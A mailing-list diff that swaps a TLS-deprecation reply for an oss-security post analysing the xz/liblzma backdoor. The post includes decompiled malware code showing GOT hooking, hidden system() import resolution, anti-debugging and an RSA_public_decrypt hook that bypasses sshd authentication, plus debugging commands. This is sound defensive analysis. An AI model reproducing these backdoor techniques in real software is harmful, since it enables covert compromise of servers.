@@ -1,4 +1,4 @@
-Received: (qmail 21822 invoked by uid 550); 9 Aug 2024 12:32:13 -0000
+Received: (qmail 16032 invoked by uid 550); 31 Mar 2024 20:25:19 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -7,120 +7,436 @@ List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
-Received: (qmail 5276 invoked from network); 9 Aug 2024 10:08:57 -0000
-X-CSE-ConnectionGUID: kmums22oSOGy5D5j3JbCig==
-X-CSE-MsgGUID: ufaK4s2GSqSN80zFaHuk+g==
-X-ExtLoop: 1
-X-ThreatScanner-Verdict: Negative
-X-IPAS-Result: =?us-ascii?q?A2FZBQAW6rVm/3+atFtaHgEBCxIMSYE7C4NBgWeEU5FCL?=
- =?us-ascii?q?QOEO5MBhlaBfg8BAQEBAQEBAQEJOwkEAQEDBIQ5RgKJVSc1CA4BAgQBAQEBA?=
- =?us-ascii?q?wIDAQEBAQEBAQEGAQEBBQEBAQEBAQYEAQEBAoEdhS9GDYJggSqBJgEBAQEBA?=
- =?us-ascii?q?QEBAQEBAR0CDX0BAQEBAgEjWwsLBBQqAgJWGwEBEAWCZwGCQSMUrWkaN3qBM?=
- =?us-ascii?q?oEB3jGBZgaBSIhLASqBMgKEBgGEdkKCDYEVJwuCeD6BBQGBWwEDhTmCaQSPD?=
- =?us-ascii?q?IMQgg0QiVsmiHd9iAJSdSIDJjMhAhEBVRMXCwkFiUkKgyOBdCaEF4E1FYNkg?=
- =?us-ascii?q?WcMYYhUgQ6BPoEpNQGDQEuDXhyBY0I/gll0VkgCDQJRHUACAQttPRQhCQsbB?=
- =?us-ascii?q?qVIBA4ngVyCMA4mfRAEHoE4UhENkxwzsj6EHoFjijGVKgYPBC+BTZYDknCYb?=
- =?us-ascii?q?417lRxMAYUygWkBghNNIBiDI1EZD444g2PMRIEIKQIHAQoBAQMJi2KBSwEB?=
-IronPort-PHdr: A9a23:ndvXTBaHuAwFK3wEESHHCRj/LTGb0IqcDmcuAnoPtbtCf+yZ8oj4O
- wSHvLMx1wePDNmQsagMotGVmp6jcFRI2YyGvnEGfc4EfD4+ouJSsioeReWoMgnFFsPsdDEwB
- 89YVVVorDmROElRH9viNRWJ+iXhpTEdFQ/iOgVrO+/7BpDdj9it1+C15pbffxhEiCCybL58M
- Bm6twHcu8YZjYd8NKo61wfErGZPd+lKymxkIk6ekQzh7cmq5p5j9CpQu/Ml98FeVKjxYro1Q
- 79FAjk4Km45/MLluwHMQgeW+HYSXXgYngJHDAbZ4h76WIzxsjbhuepmxCaaJ8z2QqsqVjmk8
- qxmVQXniCYDNz4+7WHXlsl9h79VrR69uxByxZPfbYeIP/R8Y6zdZ8sXSnZCUMhfWCNODJ6yY
- ZUBD+QBP+lVtJPyq0cUoBakGQWgGuHixzlVjXH2x6061OEhHBnC0gM+GdIOq2nfosv0NKcXV
- OC60rPIzTDZYPNQxDzw74rIfQ4nofGXRr9/bdDeyVMxGAPZlFmfspLqMiqT2+8QvGeV8/BuW
- vizi247tQ5xuD6vy98ihIfJiY8Yzl7K+CF7zYsoONG2Rk51bNGkHZZftCyXNoh7T8IhTmxru
- Ss31KMLtJ21ciUI1JgqxAPSZuKFfoSU5B/oSeifITB9hH1/ebK/gQ6/8VK+xeLhVsm7ykpKo
- jBZndnLs3AA0QHY5MufSvZl+kqtxCyD2x3Q5+1YO0w4iKrWJpE7zrItiJYes0LOFTLslkrsl
- q+ZbEAk9/Ct6+Tgf7rpuIeRN5RxigHiKqQundG/AfggPggOQWeb/eO82aXm/ULjQbVKiuc6n
- bXDv5DAO8sburS1DBRL3Yo76ha/CSmp0MgAkHQDMV5JYg+Lgov1N13UPfz1Dfiyj06xnDt1x
- f3KJrjhDY/MLnjHnrfhZ7F960tExQox099f4YlUB6odL/3pQE/+qsDYAgUiPAOq2+rnDs5y2
- ZsEWW2TGq+ZLL/SsViQ6+4yO+WMfpMauC7hK/g54P7jlXg5mUQGfaWwxpsYdmy3Hul8I0WYf
- XrtgswMEWMLvgolUOzqk0eOUTlLZ3msWaI96Cs0CIaiDYvZWo+th7mB0D+mEZ1VZ2BGD0iBH
- 2/neYqKRfkCdD6fLMl5njwfTbihRZcs2wm3ugHixLRrNvHU+jUWtZ371Nh6+enTlRYq+DJsF
- sqTy26DHClImTYPXCRzx610vFZ81kar1aljn+ceEsRe4exAVgN8PpnZnMJgDNWneA/HZZ+1S
- VOjT8+jCDd5GtA8xcQmaE9nFsnkhB2VjHniOKMci7HeXM98yanbxXWkf65A
-IronPort-Data: A9a23:lUca9a/HCe+a8f04SHNNDrUD23+TJUtcMsCJ2f8bNWPcYEJGY0x3z
- WJNWjuEbvyMY2qnL9t3bIm+/UhU656Bx9UyHQc6/y4xFiIbosfsO4+Ufxz6V8+wwm0vb67GA
- +E2MISowBUcFyKEzvuVGuG86yE6jOfQHeKU5NfsYkhZXRVjRDoqlSVtkus4hp8AqdWiCmthg
- /uryyHkEAHjg28c3l48sfrZ9Es/5KWq4Vv0g3RnDRx1lA6G/5UqJM9HTU2BByOQapVZGOe8W
- 9HCwNmRlo8O105wYj8Nuu+TnnwiGtY+DyDX4pZlc/HKbix5m8AH+v1T2Mw0MBkI1GrTxo4ZJ
- OJl7vRcQS9xVkHFdX90vxNwS0mSNoUekFPLzOTWXWV+ACQqflO1q8iCAn3aMqUb//tyGjsU8
- sc/ByFQQk2B3MC867O0H7wEasQLdKEHPasas3BkizrQF/s6B5rOK0nIzY4Bmm5g3oYXQKqYP
- pBGAdZsRE2ojxlnOFoRE7o1lf2lmj/1flW0rXrM+PRpvjmLlVIZPL7FLdTcWYCRH+puh32+9
- jrU0W3ZHxJZO4nKodaC2jf27gPVpgv8Q5lXD7Cz6+RrnEy7wm0IFAZQUkO2p+awjkr4UNVaQ
- 3H44QJ39/d0rRH3C4CtB1jp+TiNsgUYHtZBFas78xnLwKfQ7A+SAW1CRDMphMEaifLajAcCj
- jeh9+4FzxQ269V5lVr1GnyoQf9e9MTbwaLupcPJcOfd3+TenQ==
-IronPort-HdrOrdr: A9a23:NmIlKqnEtmOrFpl5Tl9aPo8C8Q7pDfIi3DAbv31ZSRFFG/Fw5P
- re+cjztCWYtN5yMEtLpTnuAsa9qB/nhPpICMwqTNCftWrd1ldATrsP0WKK+VSJcBEWtNQtt5
- uIGJIfNDSfNykYsS+32miFL+o=
-X-Talos-CUID: 9a23:bDw19m/kC/OxFhUwX0iVv00RB8U+KCfa91D/MhKUVGQyare+SFDFrQ==
-X-Talos-MUID: 9a23:fjzYfQUFbKZMRN/q/CLijRI+L51H2L2VLhBVg7sPm9SHdiMlbg==
-X-IronPort-Anti-Spam-Filtered: true
-X-ProximusIPWarmup: true
-DKIM-Filter: OpenDKIM Filter v2.11.0 mail.caret.be 811232C0084
-Content-Type: multipart/alternative;
- boundary="------------ruP0aHwB9eKVS080h0iWp9bY"
-Message-ID: <6c5622dc-681e-4117-ab0d-ef3a2f85dd31@caret.be>
-Date: Fri, 9 Aug 2024 12:08:07 +0200
-MIME-Version: 1.0
-User-Agent: Mozilla Thunderbird
+Received: (qmail 15669 invoked from network); 31 Mar 2024 20:25:05 -0000
+Date: Sun, 31 Mar 2024 22:25:02 +0200
+From: Solar Designer <solar@openwall.com>
 To: oss-security@lists.openwall.com
-References: <CAJbOq16ebWS21u439bcV764HhaeQHF+eO64LdMAAKFgjdDLrMg@mail.gmail.com>
- <20240806171232.6bd08942@zbook> <ZrJv8PDeCxQQJVxH@itl-email>
- <20240807144047.GA12108@test> <20240807174807.GA4206@openwall.com>
- <DA850315-DB70-489A-994A-8845695BD15B@redhat.com>
-Content-Language: en-US
-From: Jens Timmerman <jens@caret.be>
-In-Reply-To: <DA850315-DB70-489A-994A-8845695BD15B@redhat.com>
-Subject: Re: [oss-security] feedback requested regarding deprecation of TLS
- 1.0/1.1
+Message-ID: <20240331202502.GA21116@openwall.com>
+References: <20240329155126.kjjfduxw2yrlxgzm@awork3.anarazel.de> <ed2715be-e7a0-4a7f-a3fd-7041f6c6fa49@fu-berlin.de> <Zgmn06K3C-nY83YH@codewreck.org>
+Mime-Version: 1.0
+Content-Type: multipart/mixed; boundary="DocE+STaALJfprDB"
+Content-Disposition: inline
+In-Reply-To: <Zgmn06K3C-nY83YH@codewreck.org>
+User-Agent: Mutt/1.4.2.3i
+Subject: Re: [oss-security] backdoor in upstream xz/liblzma leading to ssh server compromise
 
---------------ruP0aHwB9eKVS080h0iWp9bY
-Content-Type: text/plain; charset=UTF-8; format=flowed
-Content-Transfer-Encoding: 8bit
+--DocE+STaALJfprDB
+Content-Type: text/plain; charset=us-ascii
+Content-Disposition: inline
+
+On Mon, Apr 01, 2024 at 03:13:39AM +0900, Dominique Martinet wrote:
+> Michael.Karcher wrote on Sun, Mar 31, 2024 at 07:13:35PM +0200:
+> > You can find this script (and possibly other stuff I found interesting later)
+> > at https://github.com/karcherm/xz-malware .
+> 
+> This list requires that the content is made available in messages
+> themselves and not just links, so I've copied the README below
+
+Thank you both.
+
+>  b00: 'yolAbejyiejuvnup=Evjtgvsh5okmkAvj\x00'
+
+For those wondering about this cryptic string, it was previously
+determined to be the backdoor's "kill switch".  If put in the
+environment before sshd startup, the backdoor becomes inactive:
+
+https://piaille.fr/@zeno/112185928685603910
+
+There's further analysis of the binary payload here:
+
+https://gist.github.com/smx-smx/a6112d54777845d389bd7126d6e9f504
+
+I've attached the gist .md file above (as of "Revisions 52") to this
+message, but it's ongoing analysis as seen in the comments.
+
+Alexander
+
+--DocE+STaALJfprDB
+Content-Type: text/plain; charset=us-ascii
+Content-Disposition: attachment; filename="backdoor_analysis.md"
+
+##### Init routines
+- `Llzma_delta_props_decoder` -> `backdoor_ctx_save`
+- `Llzma_block_param_encoder_0` -> `backdoor_init`
+- `Llzma_delta_props_encoder` -> `backdoor_init_stage2`
+
+-----
+##### Prefix Trie (https://social.hackerspace.pl/@q3k/112184695043115759)
+- `Llzip_decode_1` -> `table1`
+- `Lcrc64_clmul_1` -> `table2`	
+
+- `Llz_stream_decode` -> `count_1_bits`
+- `Lsimple_coder_update_0` -> `table_get`
+  - Retrieves the index of the encoded string given the plaintext string in memory
+- `Lcrc_init_0` -> `import_lookup`
+- `.Lcrc64_generic.0` -> `import_lookup_ex`
+-----
+
+##### Anti RE and x64 code Dasm
+- `Llzma_block_buffer_encode_0` -> `check_software_breakpoint`
+- `Lx86_code_part_0` -> `code_dasm`
+-----
+
+- `Llzma_delta_decoder_init_part_0` -> `backdoor_vtbl_init`
+  - It sets up a vtable with core functions used by the backdoor
+
+- `Lstream_decoder_memconfig_part_1` -> `get_lzma_allocator`
+
+- `Llzma_simple_props_encode_1` -> `j_tls_get_addr`
+- `Llzma_block_uncomp_encode_0` -> `rodata_ptr_offset`
+
+- `Llzma12_coder_1` -> `global_ctx`
+
+----
+##### ELF parsing
+- `Llzma_filter_decoder_is_supported.part.0` -> `parse_elf_invoke`
+- `Lmicrolzma_encoder_init_1` -> `parse_elf_init`
+- `Lget_literal_price_part_0` -> `parse_elf`
+
+- `Llzma_stream_header_encode_part_0` -> `get_ehdr_address`
+- `Lparse_bcj_0` -> `process_elf_seg`
+- `Llzma_simple_props_size_part_0` -> `is_gnu_relro`
 
 
-On 8/8/24 12:46 PM, Clemens Lang wrote:
-> Hi,
->
->
-> Speaking of LTS distros: RHEL 6.10 supports TLS 1.2.
+##### Stealthy ELF magic verification 
+```c
+  // locate elf header
+  while ( 1 )
+  {
+    if ( (unsigned int)table_get(ehdr, 0LL) == STR__ELF ) // 0x300
+      break; // found
+    ehdr -= 64; // backtrack and try again
+    if ( ehdr == start_pointer )
+      goto not_found;
+  }
+```
+----
 
-RHEL 6.10 is not a supported distro, it's Extended Life Cycle ended 1 
-month and one week ago (30 Jun 2024)
+- `Llzma_stream_flags_compare_1` -> `get_rodata_ptr`
 
-https://access.redhat.com/support/policy/updates/errata/#Life_Cycle_Dates
+----
+##### Verified or Suspected function hooking
+- `Llzma_index_memusage_0` -> `apply_entries`
+- `Llzma_check_init_part_0` -> `apply_one_entry`
+- `Lrc_read_init_part_0` -> `apply_one_entry_internal`
 
-> At what point is a distro not LTS, but a museum piece which we can ignore?
-I believe, after it is no longer supported. I also believe the LTS means 
-that the vendor/creator of the distro will provide the support, and will 
-make security patches and possibly back-port features if requested. This 
-is nothing the community should do for them. (I can claim to support a 
-20 year old version of OpenSSL if I wanted to, but I would not 
-expect/request the OpenSSL maintainers to fix my issues for me)
-> What currently supported LTS distro does not support TLS 1.2?
->
->
->> 2. Scanning or crawling a wide variety of systems, e.g. by a search
->> engine indexer, an asset enumeration tool, a security scanner, or during
->> a pentest.
-> What good is a search engine index of a webpage no modern browser will connect to?
+- `Llzma_lzma_optimum_fast_0` -> `install_entries`
+- `Llzip_decoder_memconfig_part_0` -> `installed_func_0`
 
-It is good for penetration testers, if no normal expected users need to 
-connect to the service, and only malicious users are expected to connect 
-to it, it might be beneficial for the security posture to bring it 
-offline/put it behind a proxy.
+- `Llzma_index_prealloc_0` -> `RSA_public_decrypt GOT hook/detour`
+- `Llzma_index_stream_size_1` -> `check_special_rsa_key` ->  (thanks  [q3k](https://github.com/q3k))
+  - Called from `Llzma_index_prealloc_0`, it checks if the supplied RSA key is the special key to bypass the normal authentication flow
 
-> The other use cases sound like they’d be done with special tooling anyway, in which case that can continue to ship an older version of OpenSSL for this purpose.
->
-Agreed, if an older version of OpenSSL is needed for specific testing 
-purposes, I can boot up an old live cd in a vm, or download old source 
-releases and build OpenSSL from source myself.
+- `Lindex_decode_1` -> `installed_func_2`
+- `Lindex_encode_1` -> `installed_func_3`
+- `Llzma2_decoder_end_1` -> `apply_one_entry_ex`
 
-Regards,
+- `Llzma2_encoder_init.1` -> `apply_method_1`
+- `Llzma_memlimit_get_1` -> `apply_method_2`
+----
 
-Jens Timmerman
+##### lzma allocator / call hiding
+----
+- `Lstream_decoder_mt_end_0` -> `get_lzma_allocator_addr`
+- `Linit_pric_table_part_1` -> `fake_lzma_allocator`
+- `Lstream_decode_1` -> `fake_lzma_free`
+
+----
+##### core functionality
+
+- `Llzma_delta_props_encode_part_0` -> `resolve_imports` (including `system()`)
+- `Llzma_index_stream_flags_0` -> `process_shared_libraries`
+  - Reads the list of loaded libraries through `_r_debug->r_map`, and calls `process_shared_libraries_map` to traverse it
+- `Llzma_index_encoder_init_1` -> `process_shared_libraries_map`
+  - Traverses the list of loaded libraries, looking for specific libraries
+
+- func @0x7620 : It does indirect calls on the vtable configured by `backdoor_vtbl_init`, and is called by the `RSA_public_decrypt` hook (func#1) upon certain conditions are met
+
+Software Breakpoint check, method 1
+-----
+
+This method checks if the instruction `endbr64`, which is always present at the beginning of every function in the malware, is overwritten.
+GDB would typically do this when inserting a software breakpoint
+
+```c
+/*** address: 0xAB0 ***/
+__int64 check_software_breakpoint(_DWORD *code_addr, __int64 a2, int a3)
+{
+  unsigned int v4;
+
+  v4 = 0;
+  // [for a3=0xe230], true when *v = 0xfa1e0ff3 (aka endbr64)
+  if ( a2 - code_addr > 3 )
+    return *code_addr + (a3 | 0x5E20000) == 0xF223;// 5E2E230
+  return v4;
+}
+```
+
+----
+Function backdoor_init (0xA784)
+
+```c
+__int64 backdoor_init(rootkit_ctx *ctx, DWORD *prev_got_ptr)
+{
+  _DWORD *v2;
+  __int64 runtime_offset;
+  bool is_cpuid_got_zero;
+  void *cpuid_got_ptr;
+  __int64 got_value;
+  _QWORD *cpuid_got_ptr_1;
+
+  ctx->self = ctx;
+  // store data before overwrite
+  backdoor_ctx_save(ctx);
+  ctx->prev_got_ptr = ctx->got_ptr;
+  runtime_offset = ctx->head - ctx->self;
+  ctx->runtime_offset = runtime_offset;
+  is_cpuid_got_zero = (char *)*(&Llzma_block_buffer_decode_0 + 1) + runtime_offset == 0LL;
+  cpuid_got_ptr = (char *)*(&Llzma_block_buffer_decode_0 + 1) + runtime_offset;
+  ctx->got_ptr = cpuid_got_ptr;
+  if ( !is_cpuid_got_zero )
+  {
+    cpuid_got_ptr_1 = cpuid_got_ptr;
+    got_value = *(QWORD *)cpuid_got_ptr;
+    // replace with Llzma_delta_props_encoder (backdoor_init_stage2)
+    *(QWORD *)cpuid_got_ptr = (char *)*(&Llzma_block_buffer_decode_0 + 2) + runtime_offset;
+    // this calls Llzma_delta_props_encoder due to the GOT overwrite
+    runtime_offset = cpuid((unsigned int)ctx, prev_got_ptr, cpuid_got_ptr, &Llzma_block_buffer_decode_0, v2);
+    // restore original
+    *cpuid_got_ptr_1 = got_value;
+  }
+  return runtime_offset;
+}
+```
+----
+
+##### Function Name matching (function 0x28C0)
+```c
+str_id = table_get(a6, 0LL);
+...
+if ( str_id == STR_RSA_public_decrypt_ && v11 )
+...
+else if ( v13 && str_id == STR_EVP_PKEY_set__RSA_ )
+...
+else if (str_id != STR_RSA_get__key_ || !v17 )
+```
+
+##### Hidden calls (via `lzma_alloc`)
+`lzma_alloc` has the following prototype:
+```c
+extern void * lzma_alloc (size_t size , const lzma_allocator * allocator )
+```
+
+The malware implements a custom allocator, which is obtained from `get_lzma_allocator` @ 0x4050
+
+```c
+void *get_lzma_allocator()
+{
+  return get_lzma_allocator_addr() + 8;
+}
+
+char *get_lzma_allocator_addr()
+{
+  unsigned int i;
+  char *mem;
+
+  // Llookup_filter_part_0 holds the relative offset of `_Ldecoder_1` - 180h (0xC930)
+  // by adding 0x180, it gets to 0xCAB0 (Lx86_coder_destroy), Since the caller adds +8, we get to 0xCAB8, which is the lzma_allocator itself
+  mem = (char *)Llookup_filter_part_0;
+  for ( i = 0; i <= 0xB; ++i )
+    mem += 32;
+  return mem;
+}
+```
+
+The interface for `lzma_allocator` can be viewed for example here: https://github.com/frida/xz/blob/e70f5800ab5001c9509d374dbf3e7e6b866c43fe/src/liblzma/api/lzma/base.h#L378-L440
+
+Therefore, the allocator is `Linit_pric_table_part_1` and free is `Lstream_decode_1`
+
+- NOTE: the function used for alloc is very likely `import_lookup_ex`, which turns `lzma_alloc` into an import resolution function.
+  this is used a lot in `resolve_imports`, e.g.:
+  ```c
+                system_func = lzma_alloc(STR_system_, lzma_allocator);
+              ctx->system = system_func;
+              if ( system_func )
+                ++ctx->num_imports;
+              shutdown_func = lzma_alloc(STR_shutdown_, lzma_allocator);
+              ctx->shutdown = shutdown_func;
+              if ( shutdown_func )
+                ++ctx->num_imports;
+  ```
+ 
+The third `lzma_allocator` field, `opaque`, is abused to pass information about the loaded ELF file to the "fake allocator" function.
+This is highlighted quite well by function `Llzma_index_buffer_encode_0`:
+
+```c
+__int64 Llzma_index_buffer_encode_0(Elf64_Ehdr **p_elf, struct_elf_info *elf_info, struct_ctx *ctx)
+{
+  _QWORD *lzma_allocator;
+  __int64 result;
+  __int64 fn_read;
+  __int64 fn_errno_location;
+
+  lzma_allocator = get_lzma_allocator();
+  result = parse_elf(*p_elf, elf_info);         // reads elf into elf_info
+  if ( (_DWORD)result )
+  {
+    lzma_allocator[2] = elf_info;               // set opaque field to the parsed elf info
+    fn_read = lzma_alloc(STR_read_, lzma_allocator);
+    ctx->fn_read = fn_read;
+    if ( fn_read )
+      ++ctx->num_imports;
+    fn_errno_location = lzma_alloc(STR___errno_location_, lzma_allocator);
+    ctx->fn_errno_location = fn_errno_location;
+    if ( fn_errno_location )
+      ++ctx->num_imports;
+    return ctx->num_imports == 2; // true if we found both imports
+  }
+  return result;
+}
+```
+
+Note how, instead of `size`, the malware passes an EncodedStringID instead
+
+## Dynamic analysis
+
+1. Replace the `endbr64` in `get_cpuid` with a `jmp .` ("\xeb\xfe")
+```shell
+root@debian:~# cat /usr/lib/x86_64-linux-gnu/liblzma.so.5.6.1 > liblzma.so.5.6.1
+root@debian:~# perl -pe 's/\xF3\x0F\x1E\xFA\x55\x48\x89\xF5\x4C\x89\xCE/\xEB\xFE\x90\x90\x55\x48\x89\xF5\x4C\x89\xCE/g' -i liblzma.so.5.6.1
+```
+2. Force sshd to use the modified library with `LD_PRELOAD`
+```
+# env -i LC_LANG=C LD_PRELOAD=$PWD/liblzma.so.5.6.1 /usr/sbin/sshd -h
+```
+
+2b. or use this gdbinit file to do it all at once
+```shell
+# cat gdbinit
+set confirm off
+unset env
+set env LD_PRELOAD=/root/sshd/liblzma.so.5.6.1
+set env LANG=C
+file /usr/sbin/sshd
+set args -h
+set disassembly-flavor intel
+set confirm on
+set startup-with-shell off
+
+show env
+show args
+
+# gdb -x gdbinit
+(gdb) r
+Starting program: /usr/sbin/sshd -h
+^C <-- send CTRL-C
+Program received signal SIGINT, Interrupt.
+0x00007ffff7f8a7f0 in ?? ()
+```
 
 
---------------ruP0aHwB9eKVS080h0iWp9bY--
+3. Attach to the frozen process with your favourite debugger (`gdb attach pid`)
+```
+(gdb) bt
+#0  0x00007f8cb3b067f0 in ?? () from /root/sshd/liblzma.so.5.6.1
+#1  0x00007f8cb3b08c29 in lzma_crc32 () from /root/sshd/liblzma.so.5.6.1
+#2  0x00007f8cb3b4ffab in elf_machine_rela (skip_ifunc=<optimized out>,
+    reloc_addr_arg=0x7f8cb3b3dda0 <lzma_crc32@got[plt]>,
+    version=<optimized out>, sym=0x7f8cb3b03018, reloc=0x7f8cb3b04fc8,
+    scope=0x7f8cb3b3f4f8, map=0x7f8cb3b3f170)
+    at ../sysdeps/x86_64/dl-machine.h:300
+#3  elf_dynamic_do_Rela (skip_ifunc=<optimized out>, lazy=<optimized out>,
+    nrelative=<optimized out>, relsize=<optimized out>,
+    reladdr=<optimized out>, scope=<optimized out>, map=0x7f8cb3b3f170)
+    at ./elf/do-rel.h:147
+#4  _dl_relocate_object (l=l@entry=0x7f8cb3b3f170, scope=<optimized out>,
+    reloc_mode=<optimized out>, consider_profiling=<optimized out>,
+    consider_profiling@entry=0) at ./elf/dl-reloc.c:301
+#5  0x00007f8cb3b5e6e9 in dl_main (phdr=<optimized out>, phnum=<optimized out>,
+    user_entry=<optimized out>, auxv=<optimized out>) at ./elf/rtld.c:2318
+#6  0x00007f8cb3b5af0f in _dl_sysdep_start (
+    start_argptr=start_argptr@entry=0x7ffe17e402e0,
+    dl_main=dl_main@entry=0x7f8cb3b5c900 <dl_main>)
+    at ../sysdeps/unix/sysv/linux/dl-sysdep.c:140
+#7  0x00007f8cb3b5c60c in _dl_start_final (arg=0x7ffe17e402e0)
+    at ./elf/rtld.c:498
+#8  _dl_start (arg=0x7ffe17e402e0) at ./elf/rtld.c:585
+#9  0x00007f8cb3b5b4d8 in _start () from /lib64/ld-li
+nux-x86-64.so.2
+#10 0x0000000000000002 in ?? ()
+#11 0x00007ffe17e40fa1 in ?? ()
+#12 0x00007ffe17e40fb0 in ?? ()
+#13 0x0000000000000000 in ?? ()
+```
+
+NOTE: `_get_cpuid` will call function 0xA710, whose purpose is to detect if we're at the right point to initialize the backdoor
+Why?
+Because `elf_machine_rela` will call `_get_cpuid` for both `lzma_crc32` and `lzma_crc64`.
+Since the modified code is part of `lzma_crc64`, 0xA710 has a simple call counter in it to trace how many times it has been called, and  make sure the modification doesn't trigger for `lzma_crc32`.
+
+- first call (0): -> `lzma_crc32`
+- second call (1): -> `lzma_crc64`
+
+```c
+  if ( call_counter == 1 )
+  {
+    /** NOTE: some of these fields are unverified and guessed **/
+    rootkit_ctx.head = 1LL;
+    memset(&rootkit_ctx.runtime_offset, 0, 32);
+    rootkit_ctx.prev_got_ptr = prev_got_ptr;
+    backdoor_init(&rootkit_ctx, prev_got_ptr);  // replace cpuid got entry
+  }
+  ++call_counter;
+  cpuid(a1, &v5, &v6, &v7, &rootkit_ctx);
+  return v5;
+}
+```
+
+At this point, you can issue `detach` and attach with other debuggers if needed.
+
+
+Once attached, set relevant breakpoints and restore the original bytes ("\xF3\x0F\x1E\xFA")
+
+
+##### breakpoint on RSA_public_decrypt hook
+```
+(gdb) find /b 0x7ffff73bf000, 0x7ffff73e8000, 0xF3, 0x0F, 0x1E, 0xFA, 0x41, 0x57, 0xB9, 0xAE, 0x00, 0x00, 0x00, 0x31
+0x7ffff73d1d00
+1 pattern found.
+(gdb) hbreak *0x7ffff73d1d00
+Hardware assisted breakpoint 1 at 0x7ffff73d1d00
+(gdb) set follow-fork-mode child
+(gdb) c
+...
+```
+
+Now connect via https://gist.github.com/keeganryan/a6c22e1045e67c17e88a606dfdf95ae4
+
+```
+...
+Thread 3.1 "sshd" hit Breakpoint 1, 0x00007ffff73d1d00 in ?? () from /lib/x86_64-linux-gnu/liblzma.so.5
+(gdb) bt
+#0  0x00007ffff73d1d00 in ?? () from /lib/x86_64-linux-gnu/liblzma.so.5
+#1  0x00007ffff73d1ae7 in ?? () from /lib/x86_64-linux-gnu/liblzma.so.5 <-- Llzma_index_prealloc_0 (offset 0x48 in vtable)
+#2  0x00005555556bdd00 in ?? ()
+#3  0x0000000100000004 in ?? ()
+#4  0x00007fffffffdeb0 in ?? ()
+#5  0x00000001f74b5d7a in ?? ()
+#6  0x0000000000000000 in ?? ()
+```
+
+##### RSA_public_decrypt GOT hook (Llzma_index_prealloc_0)
+```c
+  /** the following happens during pubkey login **/
+  
+  params[0] = 1;                                // should we call original?
+  // this call checks if the supplied RSA key is special
+  result = installed_func_1(rsa_key, global_ctx, params); 
+  // if still 1, the payload didn't trigger, call the original function
+  // if 0, bypass validation
+  if ( params[0] ) 
+    return real_RSA_public_decrypt(flen, from, to, rsa_key);
+  return result;
+```
+
+--DocE+STaALJfprDB--
